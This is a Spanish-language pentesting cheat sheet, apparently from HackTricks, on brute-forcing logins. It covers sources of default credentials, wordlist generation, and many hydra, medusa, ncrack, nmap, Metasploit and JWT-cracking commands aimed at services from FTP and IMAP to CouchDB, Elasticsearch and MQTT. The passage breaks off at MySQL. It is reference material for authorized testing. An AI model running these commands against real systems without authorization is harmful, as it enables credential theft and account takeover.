# Fuerza Bruta - Hoja de trucos

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y automatizar fácilmente flujos de trabajo con las herramientas comunitarias más avanzadas del mundo.\
Obtenga acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Credenciales predeterminadas

**Busque en Google** las credenciales predeterminadas de la tecnología que se está utilizando, o **pruebe estos enlaces**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Crea tus propios diccionarios**

Encuentra la mayor cantidad de información posible sobre el objetivo y genera un diccionario personalizado. Herramientas que pueden ayudar:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl es una herramienta de generación de listas de palabras clave que se utiliza en pruebas de penetración y en ataques de fuerza bruta. Esta herramienta se utiliza para recopilar palabras clave relevantes a partir de un sitio web o de un archivo de texto. Cewl utiliza técnicas de web scraping para extraer palabras clave de páginas web y generar una lista de palabras clave que pueden ser utilizadas en ataques de fuerza bruta.

Para utilizar Cewl, simplemente debes proporcionarle una URL o un archivo de texto como entrada. La herramienta rastreará el sitio web o analizará el archivo de texto y extraerá las palabras clave relevantes. Puedes especificar la profundidad de rastreo y otros parámetros para refinar los resultados.

Una vez que Cewl haya generado la lista de palabras clave, puedes utilizarla en ataques de fuerza bruta para intentar adivinar contraseñas o realizar otros tipos de ataques. Es importante tener en cuenta que el uso de Cewl para fines maliciosos es ilegal y puede tener consecuencias legales graves.

Cewl es una herramienta útil para los profesionales de la seguridad informática y los expertos en pruebas de penetración. Puede ayudar a identificar posibles vulnerabilidades en un sistema y fortalecer la seguridad de una organización. Sin embargo, es importante utilizar esta herramienta de manera ética y legal, y obtener el consentimiento adecuado antes de realizar pruebas de penetración en un sistema.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Genera contraseñas basadas en tu conocimiento sobre la víctima (nombres, fechas...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Una herramienta generadora de listas de palabras, que te permite proporcionar un conjunto de palabras, dándote la posibilidad de crear múltiples variaciones a partir de las palabras dadas, creando una lista de palabras única e ideal para usar en relación a un objetivo específico.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Listas de palabras

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
Obtenga acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Servicios

Ordenados alfabéticamente por nombre de servicio.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

El Protocolo de Conector de Java (AJP, por sus siglas en inglés) es un protocolo de red utilizado para la comunicación entre un servidor web y un servidor de aplicaciones Java. AJP se utiliza comúnmente en entornos de servidor web que ejecutan aplicaciones Java, como Apache Tomcat.

El objetivo principal de AJP es mejorar el rendimiento y la eficiencia de la comunicación entre el servidor web y el servidor de aplicaciones Java. AJP utiliza un formato de paquete binario compacto y optimizado para minimizar el tamaño de los datos transmitidos y reducir la sobrecarga de la red.

Una técnica común de ataque que se puede utilizar contra servidores AJP es el ataque de fuerza bruta. En este tipo de ataque, un atacante intenta adivinar la contraseña de un usuario probando diferentes combinaciones de contraseñas hasta encontrar la correcta. Esto se logra enviando solicitudes AJP con diferentes contraseñas y verificando si el servidor responde con éxito.

Para protegerse contra los ataques de fuerza bruta en servidores AJP, es importante implementar medidas de seguridad adecuadas, como el uso de contraseñas fuertes y la configuración adecuada de las políticas de bloqueo de cuentas. Además, se recomienda monitorear de cerca los registros del servidor en busca de actividades sospechosas y aplicar parches de seguridad regularmente para protegerse contra vulnerabilidades conocidas.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
# Cassandra

Cassandra es un sistema de base de datos distribuida altamente escalable y de alto rendimiento. Utiliza un modelo de datos basado en columnas y está diseñado para manejar grandes volúmenes de datos en múltiples nodos sin un único punto de fallo.

## Ataques de fuerza bruta

Un ataque de fuerza bruta es un método utilizado para descubrir contraseñas o claves de cifrado mediante la prueba exhaustiva de todas las combinaciones posibles. En el contexto de Cassandra, un ataque de fuerza bruta se puede utilizar para intentar adivinar las credenciales de acceso a un clúster de Cassandra.

### Herramientas de fuerza bruta

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta en Cassandra. Algunas de las herramientas más populares incluyen:

- Hydra: una herramienta de fuerza bruta que admite varios protocolos, incluido el protocolo de autenticación de Cassandra.
- Medusa: una herramienta de fuerza bruta que también admite varios protocolos, incluido el protocolo de autenticación de Cassandra.
- Ncrack: una herramienta de fuerza bruta de código abierto que puede utilizarse para atacar varios servicios, incluido Cassandra.

### Mitigación de ataques de fuerza bruta

Para proteger un clúster de Cassandra contra ataques de fuerza bruta, se pueden implementar las siguientes medidas de seguridad:

- Políticas de contraseñas fuertes: se deben establecer políticas de contraseñas que requieran contraseñas largas y complejas.
- Bloqueo de cuentas: se pueden implementar mecanismos de bloqueo de cuentas después de un número determinado de intentos fallidos de inicio de sesión.
- Autenticación de dos factores: se puede implementar la autenticación de dos factores para agregar una capa adicional de seguridad al proceso de inicio de sesión.

Es importante tener en cuenta que ninguna medida de seguridad es infalible y que siempre es recomendable mantenerse actualizado sobre las últimas vulnerabilidades y mejores prácticas de seguridad.
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
# CouchDB

CouchDB es una base de datos NoSQL de código abierto que utiliza JSON para almacenar datos. Es conocida por su capacidad de replicación y su capacidad de manejar grandes cantidades de datos distribuidos en múltiples servidores.

## Ataques de fuerza bruta

Un ataque de fuerza bruta es un método utilizado por los hackers para descubrir contraseñas o claves de acceso a través de la prueba sistemática de todas las combinaciones posibles. En el caso de CouchDB, un ataque de fuerza bruta se puede utilizar para intentar adivinar la contraseña de un usuario y obtener acceso no autorizado a la base de datos.

### Herramientas de fuerza bruta

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta en CouchDB. Algunas de las herramientas más populares incluyen:

- Hydra: una herramienta de fuerza bruta en línea de comandos que admite varios protocolos, incluido HTTP utilizado por CouchDB.
- Medusa: una herramienta de fuerza bruta en línea de comandos que también admite varios protocolos, incluido HTTP.
- Burp Suite: una suite de herramientas de prueba de penetración que incluye una función de ataque de fuerza bruta.

### Mitigación de ataques de fuerza bruta

Para protegerse contra los ataques de fuerza bruta en CouchDB, se recomienda seguir las mejores prácticas de seguridad, como:

- Utilizar contraseñas fuertes y únicas para las cuentas de usuario.
- Implementar bloqueo de cuenta después de un número determinado de intentos fallidos.
- Limitar el acceso a la base de datos solo a usuarios autorizados.
- Mantener el software de CouchDB actualizado con los últimos parches de seguridad.

Al seguir estas medidas de seguridad, se puede reducir significativamente el riesgo de un ataque de fuerza bruta exitoso en CouchDB.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Registro de Docker

Un registro de Docker es un servicio que permite almacenar y distribuir imágenes de Docker. Es similar a un repositorio de código fuente, pero en lugar de almacenar código, almacena imágenes de contenedores Docker. Esto permite a los desarrolladores compartir y distribuir fácilmente sus aplicaciones en contenedores.

El registro de Docker utiliza un protocolo llamado Docker Registry HTTP API para permitir la interacción con el registro. Esta API proporciona métodos para autenticarse, buscar imágenes, subir y descargar imágenes, y administrar etiquetas y versiones.

#### Ataques de fuerza bruta al registro de Docker

Un ataque de fuerza bruta es un método utilizado por los hackers para intentar adivinar contraseñas o claves de acceso mediante la prueba sistemática de todas las combinaciones posibles. En el contexto de un registro de Docker, un ataque de fuerza bruta se puede utilizar para intentar adivinar las credenciales de acceso de un usuario legítimo.

Para llevar a cabo un ataque de fuerza bruta al registro de Docker, un hacker utilizará herramientas automatizadas que intentarán diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar las credenciales correctas. Esto se hace de forma rápida y eficiente, ya que las herramientas de fuerza bruta pueden probar miles de combinaciones por segundo.

Para protegerse contra los ataques de fuerza bruta, es importante seguir buenas prácticas de seguridad, como utilizar contraseñas fuertes y complejas, implementar medidas de bloqueo después de varios intentos fallidos de inicio de sesión y utilizar autenticación de dos factores cuando sea posible.

Además, es recomendable utilizar herramientas de monitoreo y registro para detectar y responder rápidamente a cualquier actividad sospechosa en el registro de Docker. Esto puede incluir la implementación de sistemas de detección de intrusiones y la configuración de alertas para notificar cualquier intento de acceso no autorizado.

En resumen, los registros de Docker son servicios importantes para almacenar y distribuir imágenes de contenedores Docker. Sin embargo, también son objetivos atractivos para los hackers, por lo que es crucial implementar medidas de seguridad adecuadas para protegerlos contra ataques de fuerza bruta y otras amenazas.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch es un motor de búsqueda y análisis distribuido de código abierto, diseñado para almacenar, buscar y analizar grandes volúmenes de datos en tiempo real. Es ampliamente utilizado en aplicaciones web y sistemas de registro para indexar y buscar información de manera eficiente.

## Ataques de fuerza bruta

Un ataque de fuerza bruta es una técnica común utilizada para obtener acceso no autorizado a sistemas o cuentas. Consiste en probar todas las combinaciones posibles de contraseñas hasta encontrar la correcta. En el contexto de Elasticsearch, un ataque de fuerza bruta se puede utilizar para intentar adivinar las credenciales de acceso a un clúster de Elasticsearch.

### Herramientas de fuerza bruta

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta en Elasticsearch. Algunas de las más populares son:

- **Hydra**: una herramienta de línea de comandos que admite ataques de fuerza bruta en varios protocolos, incluido HTTP utilizado por Elasticsearch.
- **Medusa**: una herramienta de fuerza bruta en línea de comandos que admite ataques en varios protocolos, incluido HTTP.
- **Patator**: una herramienta de fuerza bruta modular y flexible que admite múltiples protocolos, incluido HTTP.

### Mitigación de ataques de fuerza bruta

Para proteger un clúster de Elasticsearch contra ataques de fuerza bruta, se pueden implementar las siguientes medidas de seguridad:

- **Políticas de contraseñas fuertes**: se deben establecer políticas de contraseñas que requieran contraseñas largas y complejas.
- **Bloqueo de cuentas**: se puede configurar Elasticsearch para bloquear automáticamente las cuentas después de un número determinado de intentos fallidos de inicio de sesión.
- **Limitación de intentos de inicio de sesión**: se pueden implementar mecanismos para limitar el número de intentos de inicio de sesión permitidos en un período de tiempo determinado.
- **Autenticación de dos factores**: se puede habilitar la autenticación de dos factores para agregar una capa adicional de seguridad al proceso de inicio de sesión.

Implementar estas medidas de seguridad puede ayudar a proteger un clúster de Elasticsearch contra ataques de fuerza bruta y garantizar la integridad y confidencialidad de los datos almacenados en él.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

El Protocolo de Transferencia de Archivos (FTP, por sus siglas en inglés) es un protocolo estándar utilizado para transferir archivos entre un cliente y un servidor en una red. El FTP utiliza un enfoque de autenticación basado en contraseñas para verificar la identidad del usuario y permite la transferencia de archivos tanto en modo binario como en modo ASCII.

#### Ataques de fuerza bruta contra FTP

Un ataque de fuerza bruta contra FTP es un método utilizado por los hackers para obtener acceso no autorizado a un servidor FTP. En este tipo de ataque, el hacker intenta adivinar la contraseña correcta probando diferentes combinaciones de contraseñas hasta encontrar la correcta.

Existen varias herramientas disponibles para llevar a cabo ataques de fuerza bruta contra FTP, como Hydra y Medusa. Estas herramientas automatizan el proceso de prueba de contraseñas y pueden probar miles de combinaciones en poco tiempo.

Para protegerse contra los ataques de fuerza bruta contra FTP, es importante seguir buenas prácticas de seguridad, como utilizar contraseñas fuertes y cambiarlas regularmente. Además, se recomienda implementar medidas de seguridad adicionales, como la limitación de intentos de inicio de sesión y la implementación de sistemas de detección de intrusos.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### Fuerza Bruta Genérica HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Autenticación Básica HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - Enviar formulario mediante POST

El método de ataque de fuerza bruta mediante el envío de formularios mediante POST es una técnica comúnmente utilizada para intentar obtener acceso no autorizado a un sistema o aplicación web. Este método se basa en la idea de que los usuarios suelen utilizar contraseñas débiles o predecibles, lo que facilita su adivinación.

El proceso de ataque consiste en enviar múltiples solicitudes POST al servidor web objetivo, cada una con una combinación diferente de nombre de usuario y contraseña. El atacante utiliza un programa automatizado para generar estas combinaciones y enviarlas al servidor.

El objetivo principal de este tipo de ataque es encontrar una combinación válida de nombre de usuario y contraseña que permita el acceso al sistema. Una vez que se encuentra una combinación válida, el atacante puede utilizarla para obtener acceso no autorizado y realizar diversas acciones maliciosas.

Es importante destacar que este método de ataque es considerado ilegal y está penado por la ley en la mayoría de los países. Solo se debe utilizar con fines legítimos, como parte de una evaluación de seguridad autorizada o en el contexto de pruebas de penetración.

Para protegerse contra este tipo de ataques, es fundamental utilizar contraseñas seguras y robustas, que combinen letras mayúsculas y minúsculas, números y caracteres especiales. Además, se recomienda implementar medidas de seguridad adicionales, como bloqueo de cuentas después de varios intentos fallidos de inicio de sesión y la implementación de sistemas de autenticación de dos factores.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Para http**s** tienes que cambiar de "http-post-form" a "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla o (D)rupal o (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

IMAP (Internet Message Access Protocol) es un protocolo de correo electrónico que permite a los usuarios acceder y administrar sus correos electrónicos almacenados en un servidor remoto. A diferencia del protocolo POP (Post Office Protocol), que descarga los correos electrónicos en el dispositivo del usuario, IMAP mantiene los correos electrónicos en el servidor, lo que permite un acceso más flexible y sincronizado desde múltiples dispositivos.

#### Ataque de fuerza bruta contra IMAP

Un ataque de fuerza bruta contra IMAP es un método utilizado por los hackers para obtener acceso no autorizado a una cuenta de correo electrónico mediante la prueba de múltiples combinaciones de nombres de usuario y contraseñas. Este tipo de ataque se basa en la suposición de que el usuario ha elegido una contraseña débil o fácil de adivinar.

Para llevar a cabo un ataque de fuerza bruta contra IMAP, los hackers utilizan herramientas automatizadas que generan y prueban una gran cantidad de combinaciones de nombres de usuario y contraseñas en un corto período de tiempo. Estas herramientas aprovechan la falta de restricciones en los intentos de inicio de sesión y la velocidad de procesamiento de los servidores IMAP para probar miles o incluso millones de combinaciones en poco tiempo.

Para protegerse contra los ataques de fuerza bruta en IMAP, es importante utilizar contraseñas seguras y complejas que sean difíciles de adivinar. Además, se recomienda habilitar la autenticación de dos factores (2FA) para agregar una capa adicional de seguridad a la cuenta de correo electrónico.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
IRC (Internet Relay Chat) es un protocolo de comunicación en tiempo real ampliamente utilizado para la comunicación en línea. Permite a los usuarios participar en conversaciones grupales o privadas a través de canales de chat. Los canales de IRC son similares a las salas de chat, donde los usuarios pueden unirse y enviar mensajes a todos los participantes del canal. IRC es una herramienta comúnmente utilizada por los hackers para comunicarse y colaborar en tiempo real durante las operaciones de hacking.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI (Internet Small Computer System Interface) es un protocolo de red que permite a los dispositivos de almacenamiento en red (como discos duros, cintas y unidades de estado sólido) ser accesibles a través de una red IP. Utiliza el protocolo TCP/IP para transmitir comandos SCSI (Small Computer System Interface) entre un iniciador (cliente) y un destino (servidor). El objetivo del iSCSI es proporcionar una solución de almacenamiento de bajo costo y alta velocidad para entornos de red.

El proceso de conexión iSCSI implica la autenticación del iniciador con el destino y la creación de una sesión de iSCSI. Una vez establecida la sesión, el iniciador puede enviar comandos SCSI al destino para acceder y manipular los datos almacenados en los dispositivos de almacenamiento en red.

El ataque de fuerza bruta es un método utilizado para descubrir credenciales de acceso a sistemas o servicios. En el contexto de iSCSI, un ataque de fuerza bruta se puede utilizar para intentar adivinar las credenciales de acceso al destino iSCSI. Esto se logra probando diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar la correcta.

Es importante tener en cuenta que realizar un ataque de fuerza bruta sin autorización es ilegal y puede tener consecuencias legales graves. Solo se debe realizar un ataque de fuerza bruta en un entorno controlado y con el permiso explícito del propietario del sistema o servicio objetivo.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Token (JWT) es un estándar abierto (RFC 7519) que define un formato compacto y seguro para transmitir información entre partes como un objeto JSON. Los JWT se utilizan comúnmente para autenticar y autorizar solicitudes en aplicaciones web y servicios API.

Un JWT consta de tres partes separadas por puntos: el encabezado, la carga útil y la firma. El encabezado especifica el algoritmo de firma utilizado y el tipo de token. La carga útil contiene la información que se va a transmitir, como los datos del usuario o los permisos. La firma se utiliza para verificar la integridad del token y garantizar que no haya sido modificado.

El proceso de fuerza bruta es una técnica utilizada para descifrar o adivinar una contraseña o clave secreta probando todas las combinaciones posibles hasta encontrar la correcta. En el contexto de JWT, un ataque de fuerza bruta se enfoca en adivinar la clave secreta utilizada para firmar los tokens.

Para llevar a cabo un ataque de fuerza bruta contra un JWT, un atacante intentará generar diferentes claves y firmar el token con cada una de ellas hasta encontrar la clave correcta. Esto puede ser un proceso lento y costoso computacionalmente, especialmente si la clave es lo suficientemente larga y compleja.

Para protegerse contra ataques de fuerza bruta en JWT, es importante utilizar claves secretas fuertes y de longitud adecuada. Además, se recomienda implementar medidas de seguridad adicionales, como el bloqueo de cuentas después de un número determinado de intentos fallidos de autenticación.

En resumen, los JWT son una forma popular de transmitir información de manera segura entre partes. Sin embargo, es importante tener en cuenta los posibles riesgos de seguridad, como los ataques de fuerza bruta, y tomar las medidas adecuadas para proteger los tokens y las claves secretas utilizadas en su firma.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
LDAP (Lightweight Directory Access Protocol) es un protocolo de acceso a directorios ligero que se utiliza para acceder y mantener información de directorios distribuidos a través de una red. Es comúnmente utilizado para autenticación y búsqueda de información en sistemas de directorios como Active Directory.

### Ataques de fuerza bruta contra LDAP

Un ataque de fuerza bruta contra LDAP implica intentar adivinar las credenciales de acceso a un servidor LDAP mediante la prueba de diferentes combinaciones de nombres de usuario y contraseñas. Este tipo de ataque es muy común y puede ser automatizado utilizando herramientas específicas.

Los atacantes utilizan diccionarios de contraseñas predefinidos o generan combinaciones aleatorias para probar todas las posibles combinaciones. Esto puede ser un proceso lento y requiere tiempo y recursos para probar todas las combinaciones posibles.

Para protegerse contra los ataques de fuerza bruta contra LDAP, es importante implementar medidas de seguridad como políticas de contraseñas fuertes, bloqueo de cuentas después de un número determinado de intentos fallidos y el uso de autenticación de dos factores. Además, es recomendable monitorear los registros de acceso y utilizar herramientas de detección de intrusiones para identificar y bloquear intentos de fuerza bruta.
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT (Message Queuing Telemetry Transport) es un protocolo de mensajería ligero y de bajo consumo de energía diseñado para la comunicación entre dispositivos en redes de área local o de ancho de banda limitado. Es ampliamente utilizado en aplicaciones de Internet de las cosas (IoT) debido a su eficiencia y simplicidad.

El protocolo MQTT utiliza un enfoque de publicación/suscripción, donde los dispositivos pueden publicar mensajes en un tema específico y otros dispositivos pueden suscribirse a ese tema para recibir los mensajes. Esto permite una comunicación eficiente y escalable entre los dispositivos conectados.

Una técnica común utilizada en el hacking de MQTT es el ataque de fuerza bruta. Este ataque consiste en intentar adivinar la contraseña de un dispositivo MQTT mediante la prueba de diferentes combinaciones de contraseñas hasta encontrar la correcta. Los hackers pueden utilizar herramientas automatizadas para realizar este tipo de ataque y comprometer la seguridad de los dispositivos MQTT.

Para protegerse contra los ataques de fuerza bruta en MQTT, es importante utilizar contraseñas fuertes y complejas, así como implementar medidas de seguridad adicionales, como la autenticación de dos factores. Además, se recomienda mantener el software MQTT actualizado y utilizar firewalls para limitar el acceso no autorizado a los dispositivos MQTT.

En resumen, MQTT es un protocolo de mensajería utilizado en aplicaciones de IoT y puede ser vulnerable a ataques de fuerza bruta. Es fundamental tomar medidas de seguridad adecuadas para proteger los dispositivos MQTT y garantizar la integridad de la comunicación entre los dispositivos conectados.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

Mongo es una base de datos NoSQL ampliamente utilizada en aplicaciones web y móviles. Al ser una base de datos NoSQL, Mongo no utiliza tablas y filas como las bases de datos relacionales tradicionales, sino que almacena los datos en documentos JSON flexibles. Esto permite una mayor escalabilidad y flexibilidad en el almacenamiento y consulta de datos.

Sin embargo, al igual que cualquier otra base de datos, Mongo también puede ser vulnerable a ataques de fuerza bruta. La fuerza bruta es un método de ataque en el que un hacker intenta adivinar la contraseña correcta probando diferentes combinaciones hasta encontrar la correcta.

Para proteger una base de datos Mongo contra ataques de fuerza bruta, es importante seguir algunas buenas prácticas de seguridad. Estas incluyen:

1. Utilizar contraseñas fuertes: Asegúrese de utilizar contraseñas largas y complejas que sean difíciles de adivinar. Evite contraseñas comunes o predecibles.

2. Limitar el acceso remoto: Restrinja el acceso remoto a la base de datos solo a las direcciones IP autorizadas. Esto ayudará a prevenir ataques de fuerza bruta desde ubicaciones no autorizadas.

3. Implementar bloqueo de cuentas: Configure su base de datos Mongo para bloquear automáticamente las cuentas después de un número determinado de intentos fallidos de inicio de sesión. Esto dificultará los ataques de fuerza bruta al limitar el número de intentos posibles.

4. Actualizar regularmente: Mantenga su base de datos Mongo actualizada con las últimas versiones y parches de seguridad. Esto ayudará a proteger contra vulnerabilidades conocidas que podrían ser explotadas en ataques de fuerza bruta.

Al seguir estas prácticas de seguridad, puede ayudar a proteger su base de datos Mongo contra ataques de fuerza bruta y mantener sus datos seguros.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQL es un sistema de gestión de bases de datos relacional de código abierto ampliamente utilizado. Es conocido por su rendimiento, confiabilidad y facilidad de uso. MySQL utiliza el lenguaje de consulta estructurado (SQL) para administrar y manipular los datos almacenados en la base de datos.

#### Ataques de fuerza bruta contra MySQL

